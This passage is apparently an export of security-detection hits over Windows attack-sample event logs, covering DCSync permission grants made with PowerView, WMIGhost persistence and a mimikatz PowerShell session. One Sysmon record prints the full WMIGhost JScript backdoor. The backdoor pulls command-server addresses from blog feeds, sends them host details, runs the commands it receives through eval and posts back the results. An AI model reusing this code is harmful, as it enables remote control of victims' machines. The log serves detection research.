da640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;;RP;c7407360-20bf-11d0-a768-00aa006e0529;;RU)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;RU)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;AU)(OA;OICI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-738609754-2819869699-4189121830-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)
OperationType: '%%14675'
SubjectUserName: bob
"
2019-03-25T21:28:45.026630+00:00,Powerview Add-DomainObjectAcl DCSync AD Extend Right,data/EVTX-ATTACK-SAMPLES/Persistence/DACL_DCSync_Right_Powerview_ Add-DomainObjectAcl.evtx,1,Microsoft-Windows-Security-Auditing,5136,198242602,DC1.insecurebank.local,"OpCorrelationID: 98E50F6A-AE61-4BFF-A9F0-CCFA5CCB555C
AppCorrelationID: '-'
AttributeSyntaxOID: 2.5.5.15
ObjectDN: DC=insecurebank,DC=local
SubjectLogonId: '0x40f2719'
DSType: '%%14676'
ObjectGUID: C6FAF700-BFE4-452A-A766-424F84C29583
AttributeLDAPDisplayName: nTSecurityDescriptor
SubjectDomainName: insecurebank
SubjectUserSid: S-1-5-21-738609754-2819869699-4189121830-1108
ObjectClass: domainDNS
DSName: insecurebank.local
AttributeValue: O:BAG:BAD:AI(OA;CIIO;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-738609754-2819869699-4189121830-522)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1120)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-498)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;;RP;c7407360-20bf-11d0-a768-00aa006e0529;;RU)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;RU)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;AU)(OA;OICI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-738609754-2819869699-4189121830-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)
OperationType: '%%14675'
SubjectUserName: bob
"
2019-03-25T21:28:45.026630+00:00,Powerview Add-DomainObjectAcl DCSync AD Extend Right,data/EVTX-ATTACK-SAMPLES/Persistence/DACL_DCSync_Right_Powerview_ Add-DomainObjectAcl.evtx,1,Microsoft-Windows-Security-Auditing,5136,198242603,DC1.insecurebank.local,"OpCorrelationID: 98E50F6A-AE61-4BFF-A9F0-CCFA5CCB555C
AppCorrelationID: '-'
AttributeSyntaxOID: 2.5.5.15
ObjectDN: DC=insecurebank,DC=local
SubjectLogonId: '0x40f2719'
DSType: '%%14676'
ObjectGUID: C6FAF700-BFE4-452A-A766-424F84C29583
AttributeLDAPDisplayName: nTSecurityDescriptor
SubjectDomainName: insecurebank
SubjectUserSid: S-1-5-21-738609754-2819869699-4189121830-1108
ObjectClass: domainDNS
DSName: insecurebank.local
AttributeValue: O:BAG:BAD:AI(OA;CIIO;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-738609754-2819869699-4189121830-522)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1120)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-498)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1120)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;;RP;c7407360-20bf-11d0-a768-00aa006e0529;;RU)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;RU)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;AU)(OA;OICI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-738609754-2819869699-4189121830-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)
OperationType: '%%14674'
SubjectUserName: bob
"
2019-04-03T18:11:54.098352+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Persistence/wmighost_sysmon_20_21_1.evtx,1,Microsoft-Windows-Sysmon,1,7194,PC04.example.corp,"Image: C:\Users\user01\Desktop\WMIGhost.exe
RuleName: ''
Description: '?'
TerminalSessionId: 2
ParentCommandLine: C:\Windows\Explorer.EXE
Product: '?'
Company: '?'
ParentProcessId: 3032
LogonGuid: 365ABB72-F44E-5CA4-0000-00202BAF0A00
Hashes: MD5=0DF40B226A4913A57668B83B7C7B443C,IMPHASH=8812FF21AEB160E8800257140ACAE54B
ParentProcessGuid: 365ABB72-F456-5CA4-0000-001095090B00
ProcessId: 3328
CurrentDirectory: C:\Users\user01\Desktop\
ProcessGuid: 365ABB72-F76A-5CA4-0000-0010FA0D1700
CommandLine: '""C:\Users\user01\Desktop\WMIGhost.exe"" '
FileVersion: '?'
User: PC04\IEUser
LogonId: '0xaaf2b'
IntegrityLevel: High
ParentImage: C:\Windows\explorer.exe
UtcTime: 2019-04-03 18:11:54.058
"
2019-04-03T18:11:54.178467+00:00,Suspicious Scripting in a WMI Consumer,data/EVTX-ATTACK-SAMPLES/Persistence/wmighost_sysmon_20_21_1.evtx,1,Microsoft-Windows-Sysmon,20,7195,PC04.example.corp,"Operation: Modified
RuleName: ''
EventType: WmiConsumerEvent
Name: ' ""ProbeScriptFint""'
User: PC04\IEUser
Type: Script
Destination: ' ""var sXmlUrl=\""http://kumardeep.sosblogs.com/The-first-blog-b1/RSS-b1-rss2-posts.htm;http://blogs.rediff.com/anilchopra/feed/;http://www.blogster.com/kapoorsunil09/profile/rss\"";var sOwner=''XDD'';var MAIN=function(){$=this;$.key=''W'';$.sFeedUrl=sXmlUrl;$.sOwner=sOwner;$.sXmlUrl='''';$.oHttp=null;$.oShell=null;$.oStream=null;$.sHostName=null;$.sOSType=null;$.sMacAddress=null;$.sURLParam=null;$.version=''2.0.0'';$.runtime=5000;$.oWMI=null;$._x=ActiveXObject;};MAIN.prototype={InitObjects:function(){$.oWMI=GetObject(''winmgmts:{impersonationLevel=impersonate}!\\\\\\\\.\\\\root\\\\cimv2'');$.oShell=new $._x(''WScript.Shell'');$.oStream=new $._x(''ADODB.Stream'');$.GetOSInfo();$.GetMacAddress();$.GenerateUrlParam();},WMI:function(sql){return $.oWMI.ExecQuery(sql);},GetOSInfo:function(){var e=new Enumerator($.WMI(''Select * from Win32_OperatingSystem''));if(!e.atEnd()){var item=e.item();$.sOSType=item.Caption+item.ServicePackMajorVersion;$.sHostName=item.CSName;}},GetMacAddress:function(){var e=new Enumerator($.WMI(''Select * from Win32_NetworkAdapter where PNPDeviceID like \\\""%PCI%\\\"" and NetConnectionStatus=2''));if(!e.atEnd()){$.sMacAddress=e.item().MACAddress;}},GenerateUrlParam:function(){var time=new Date();$.sURLParam=''cstype=server&authname=servername&authpass=serverpass&hostname=''+$.sHostName+''&ostype=''+$.sOSType+''&macaddr=''+$.sMacAddress+''&owner=''+$.sOwner+''&version=''+$.version+''&runtime=''+$.runtime;$.sURLParam+=''&t=''+time.getMinutes()+time.getSeconds();},CleanObjects:function(){$.oShell=null;$.oStream=null;var e=new Enumerator($.WMI(''Select * from Win32_Process where Name=\\\""scrcons.exe\\\""''));while(!e.atEnd()){e.item().terminate();e.moveNext();}},Decode:function(sourceStr){var keycode=sourceStr.charCodeAt(0);var source=sourceStr.substr(1);var vals=source.split('','');var result='''';for(var i=0;i<vals.length;i++){result+=String.fromCharCode(vals[i]^keycode);}return result;},circleDecode:function(sc){var base=sc.charCodeAt(0);var s=base-32;var r='''';for(var i=1;i<sc.length;i++){var nc=sc.charCodeAt(i)-s-i+1;if(nc<32){nc=126+(nc-32)%94;}r+=String.fromCharCode(nc);}return r;},MainLoop:function(){$.oHttp=new $._x(''Microsoft.XmlHttp'');var feedUrlArry=$.sFeedUrl.split('';'');var start=new Date();var oXml=new ActiveXObject(''MSXML2.DOMDocument.3.0'');for(var n=0;n<feedUrlArry.length;n++){var UrlList=new Array();var URLnum=0;try{var tstr=feedUrlArry[n].match(''http://.*?\\\\.php'');if(tstr!=null){UrlList[URLnum++]=tstr;}else{$.oHttp.Open(''GET'',feedUrlArry[n],false);$.oHttp.setRequestHeader(''User-Agent'',''Mozilla/5.0 (Windows; U; Windows NT 5.1; rv:1.9.1) Gecko/20090624 Firefox/3.5'');$.oHttp.Send();var response=$.oHttp.ResponseText.replace(/(^\\s*)|(\\s*$)/g,'''');var re=/<title>@(.*)@<\\/title>+/g;var titleList=response.match(re);for(var i=0;i<titleList.length;i++){try{oXml.loadXML(titleList[i]);var container=oXml.getElementsByTagName(''title'');var tmpstr=container[0].text.match(''@(.*)@'');UrlList[URLnum++]=$.circleDecode(tmpstr[1]);}catch(e){}}}for(var Urlindex=0;Urlindex<UrlList.length;Urlindex++){$.sXmlUrl=UrlList[Urlindex];var runnum=360;while(runnum-->0){$.oHttp.Open(''POST'',$.sXmlUrl,false);$.oHttp.setRequestHeader(''CONTENT-TYPE'',''application/x-www-form-urlencoded'');$.oHttp.Send($.sURLParam);var response=$.oHttp.ResponseText.replace(/(^\\s*)|(\\s*$)/g,'''');if(response.length>0){var commands=null;var container;try{oXml.loadXML(response);container=oXml.getElementsByTagName(''div'');for(var i=0;i<container.length;i++){if(container[i].getAttribute(''id'')==''0a552b5a4352''){commands=eval(''(''+container[i].text+'')'').command;}}}catch(e){}if(commands!=null){var commandresult='''';for(var i=0;i<commands.length;i++){var result=''no response'';try{result=eval($.Decode(commands[i].value));}catch(e){}if(i>0){commandresult+='','';}commandresult+=''\\''''+commands[i].id+''\\'':\\''''+escape(result)+''\\'''';}if(commandresult.length>0){commandresult=''{''+commandresult+''}'';$.oHttp.Open(''POST'',$.sXmlUrl,false);$.oHttp.setRequestHeader(''CONTENT-TYPE'',''application/x-www-form-urlencoded'');$.oHttp.Send($.sURLParam+''&command=result&commandresult=''+commandresult);}}else{$.sXmlUrl='''';runnum=0;}}$.runtime=(new Date()).getTime()-start.getTime();WScript.Sleep(10000);}if($.sXmlUrl.length>0){return;}}}catch(e){}}},Fire:function(){$.InitObjects();try{$.MainLoop();}catch(e){}$.CleanObjects();}};new MAIN().Fire();""'
UtcTime: 2019-04-03 18:11:54.178
"
2019-04-03T18:12:00.016862+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process;WMI Persistence - Script Event Consumer,data/EVTX-ATTACK-SAMPLES/Persistence/wmighost_sysmon_20_21_1.evtx,1,Microsoft-Windows-Sysmon,1,7203,PC04.example.corp,"Image: C:\Windows\System32\wbem\scrcons.exe
RuleName: ''
Description: WMI Standard Event Consumer - scripting
TerminalSessionId: 0
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 596
LogonGuid: 365ABB72-701F-5CA5-0000-0020E7030000
Hashes: MD5=6AEC20B9D4C1AB6F1AB297F28EB6BF93,IMPHASH=CCEC86CC0D16062391CC627BC9466A62
ParentProcessGuid: 365ABB72-7020-5CA5-0000-0010ED6A0000
ProcessId: 2636
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-F76F-5CA4-0000-0010AA201700
CommandLine: C:\Windows\system32\wbem\scrcons.exe -Embedding
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\svchost.exe
UtcTime: 2019-04-03 18:11:59.996
"
2019-04-18T16:55:37.014980+00:00,Sysmon Configuration Change,data/EVTX-ATTACK-SAMPLES/Credential Access/babyshark_mimikatz_powershell.evtx,1,Microsoft-Windows-Sysmon,16,1,IEWIN7,"Configuration: C:\Users\IEUser\Desktop\Sysmon.exe  -i
UtcTime: 2019-04-18 16:55:37.014
ConfigurationFileHash: ''
"
2019-04-18T16:55:37.125139+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/babyshark_mimikatz_powershell.evtx,1,Microsoft-Windows-Sysmon,1,3,IEWIN7,"Image: C:\Windows\Sysmon.exe
RuleName: ''
Description: System activity monitor
TerminalSessionId: 0
ParentCommandLine: C:\Windows\system32\services.exe
Product: Sysinternals Sysmon
Company: Sysinternals - www.sysinternals.com
ParentProcessId: 464
LogonGuid: 365ABB72-29B3-5CB9-0000-0020E7030000
Hashes: SHA1=FF1C037123276983C785F6CDF7EDA5A2FAB06D4A
ParentProcessGuid: 365ABB72-29B3-5CB9-0000-001056480000
ProcessId: 3192
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-AC09-5CB8-0000-0010939A0700
CommandLine: C:\Windows\Sysmon.exe
FileVersion: '9.01'
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\services.exe
UtcTime: 2019-04-18 16:55:37.014
"
2019-04-18T16:55:37.125139+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/babyshark_mimikatz_powershell.evtx,1,Microsoft-Windows-Sysmon,1,4,IEWIN7,"Image: C:\Windows\System32\wbem\unsecapp.exe
RuleName: ''
Description: Sink to receive asynchronous callbacks for WMI client application
TerminalSessionId: 0
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 588
LogonGuid: 365ABB72-29B3-5CB9-0000-0020E7030000
Hashes: SHA1=393CFBAC0AC28DCC194F88C951D856E74F5B3CB6
ParentProcessGuid: 365ABB72-29B4-5CB9-0000-0010F95D0000
ProcessId: 3232
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-AC09-5CB8-0000-0010999C0700
CommandLine: C:\Windows\system32\wbem\unsecapp.exe -Embedding
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\svchost.exe
UtcTime: 2019-04-18 16:55:37.075
"
2019-04-18T16:55:44.045089+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/babyshark_mimikatz_powershell.evtx,1,Microsoft-Windows-Sysmon,1,6,IEWIN7,"Image: C:\Users\IEUser\Desktop\Sysmon.exe
RuleName: ''
Description: System activity monitor
TerminalSessionId: 1
ParentCommandLine: '""cmd.exe"" /s /k pushd ""C:\Users\IEUser\Desktop""'
Product: Sysinternals Sysmon
Company: Sysinternals - www.sysinternals.com
ParentProcessId: 1196
LogonGuid: 365ABB72-AB27-5CB8-0000-002021CA0000
Hashes: SHA1=FF1C037123276983C785F6CDF7EDA5A2FAB06D4A
ParentProcessGuid: 365ABB72-AC01-5CB8-0000-0010BB7E0700
ProcessId: 3252
CurrentDirectory: C:\Users\IEUser\Desktop\
ProcessGuid: 365ABB72-AC10-5CB8-0000-001047A40700
CommandLine: sysmon  -c sysmonconfig-18-apr-2019.xml
FileVersion: '9.01'
User: IEWIN7\IEUser
LogonId: '0xca21'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-04-18 16:55:44.035
"
2019-04-18T16:55:44.135219+00:00,Sysmon Configuration Change,data/EVTX-ATTACK-SAMPLES/Credential Access/babyshark_mimikatz_powershell.evtx,1,Microsoft-Windows-Sysmon,16,7,IEWIN7,"Configuration: C:\Users\IEUser\Desktop\sysmonconfig-18-apr-2019.xml
UtcTime: 2019-04-18 16:55:44.135
ConfigurationFileHash: SHA1=B870A007B7F5FCE50EE1518B7134973327DBAA09
"
2019-04-18T16:56:08.370067+00:00,Hacktool - EDR-Freeze Execution;Non Interactive PowerShell Process Spawned;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/babyshark_mimikatz_powershell.evtx,1,Microsoft-Windows-Sysmon,1,13,IEWIN7,"Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: technique_id=T1086,technique_name=PowerShell
Description: Windows PowerShell
TerminalSessionId: 1
ParentCommandLine: '""cmd.exe"" /s /k pushd ""C:\Users\IEUser\Desktop""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1196
LogonGuid: 365ABB72-AB27-5CB8-0000-002021CA0000
Hashes: SHA1=04C5D2B4DA9A0F3FA8A45702D4256CEE42D8C48D,MD5=92F44E405DB16AC55D97E3BFE3B132FA,SHA256=6C05E11399B7E3C8ED31BAE72014CF249C144A8F4A2C54A758EB2E6FAD47AEC7,IMPHASH=96BA691B035D05F44E35AB23F6BA946C
ParentProcessGuid: 365ABB72-AC01-5CB8-0000-0010BB7E0700
ProcessId: 1200
CurrentDirectory: C:\Users\IEUser\Desktop\
ProcessGuid: 365ABB72-AC28-5CB8-0000-0010F3F70700
CommandLine: Powershell
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0xca21'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-04-18 16:56:08.340
"
2019-04-18T16:56:24.893827+00:00,Hacktool - EDR-Freeze Execution;Local Accounts Discovery;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/babyshark_mimikatz_powershell.evtx,1,Microsoft-Windows-Sysmon,1,14,IEWIN7,"Image: C:\Windows\System32\whoami.exe
RuleName: technique_id=T1033,technique_name=System Owner/User Discovery
